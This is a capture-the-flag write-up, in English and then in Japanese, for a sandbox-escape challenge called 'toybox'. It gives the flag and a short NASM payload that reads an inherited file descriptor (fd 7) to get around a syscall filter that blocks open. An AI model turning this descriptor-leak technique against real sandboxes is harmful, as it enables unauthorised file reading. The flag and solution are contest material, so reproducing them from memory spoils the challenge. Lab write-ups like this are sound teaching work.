---
title: toybox
level: 4
flag: FLAG{d1d_u_kn0w_O_CL03X3C?}
writer: ciffelia
---

# toybox

> Escape from Toybox
>
> http://chal-lz56g6.wanictf.org:1850/

## Solution

日本語版は英語版の後に記載しています。Japansese follows English.

In this challenge, the executable file uploaded by the user is executed on the server, but the system calls that can be invoked are restricted. While `read` and `write` are allowed, `open` cannot be called. This makes it seem like `flag.txt` cannot be read.

However, by examining the source code, it is evident that `flag.txt` is opened at line 23 in `server.c`. The opened file remains accessible even after the `exec` execution unless it is explicitly closed. Therefore, the user's code can use this file descriptor to read the flag. Upon experimentation, it is found that the value of this file descriptor is 7. Therefore, by creating a file that reads data from FD 7 and writes it to stdout, the flag can be retrieved.

The executable file is subject to the following constraints:

1. The file size must be a maximum of 10KB.
1. Only 10 specific system calls, such as `read` and `write`, can be invoked. If any other system call is attempted, the program will terminate.

If an executable file is created using high-level languages like C, its size will easily exceed 10KB. Even if the size restriction is met, various system calls would be invoked before the main function is executed, causing the program to terminate.

These constraints can be circumvented by writing assembly code. By compiling and executing the following code, the flag can be obtained.

```nasm
    global _start

    section .text
_start:
    ; read(7, buf, 256)
    mov rax, 0      ; syscall #0 (read)
    mov rdi, 7      ; from fd 7
    mov rsi, buf    ; to buf
    mov rdx, 256    ; number of bytes
    syscall

    ; write(1, buf, 256)
    mov rax, 1      ; syscall #1 (write)
    mov rdi, 1      ; to fd 1 (stdout)
    mov rsi, buf    ; from buf
    mov rdx, 256    ; number of bytes
    syscall

    ; exit(0)
    mov rax, 60     ; syscall #60 (exit)
    mov rdi, 0      ; code 0
    syscall

    section .bss
buf:
    resb 256
```

```sh
nasm -f elf64 payload.asm
ld --strip-all -o payload payload.o
```

## 解法

この問題ではユーザーがアップロードした実行可能ファイルがサーバーで実行されますが、呼び出し可能なシステムコールが制限されています。`read`や`write`は呼び出しが許可されていますが、`open`は呼び出すことができません。そのため`flag.txt`を読み出すことができないように見えます。

しかし、ソースコードを確認すると`server.c`の23行目で`flag.txt`を開いています。開かれたファイルは明示的に閉じない限り`exec`実行後も利用可能です。そのため、ユーザーのコードからこのファイルディスクリプタを利用してフラグを読み出すことができます。実験してみると、このファイルディスクリプタの値は`7`であることがわかります。そのため、FD 7からデータを読み出しstdoutに書き込むファイルを作成すればフラグが得られそうです。

ただし、この実行可能ファイルには以下のような制約が課せられます。

1. ファイルは最大で10KBまで。
2. 呼び出し可能なシステムコールは`read`, `write`などの10個のみで、それ以外の呼び出しを試みるとプログラムが終了される。

C言語などの高級言語を用いて実行可能ファイルを作成した場合、サイズは優に10KBを超えます。仮にサイズ制限をクリアしたとしても、main関数が実行される前に様々なシステムコールが呼ばれるため、プログラムが終了されてしまうでしょう。

これらの制約はアセンブリを書くことで回避できます。以下のコードをコンパイルしサーバー上で実行させるとフラグが得られます。

```nasm
    global _start

    section .text
_start:
    ; read(7, buf, 256)
    mov rax, 0      ; syscall #0 (read)
    mov rdi, 7      ; from fd 7
    mov rsi, buf    ; to buf
    mov rdx, 256    ; number of bytes
    syscall

    ; write(1, buf, 256)
    mov rax, 1      ; syscall #1 (write)
    mov rdi, 1      ; to fd 1 (stdout)
    mov rsi, buf    ; from buf
    mov rdx, 256    ; number of bytes
    syscall

    ; exit(0)
    mov rax, 60     ; syscall #60 (exit)
    mov rdi, 0      ; code 0
    syscall

    section .bss
buf:
    resb 256
```

```sh
nasm -f elf64 payload.asm
ld --strip-all -o payload payload.o
```
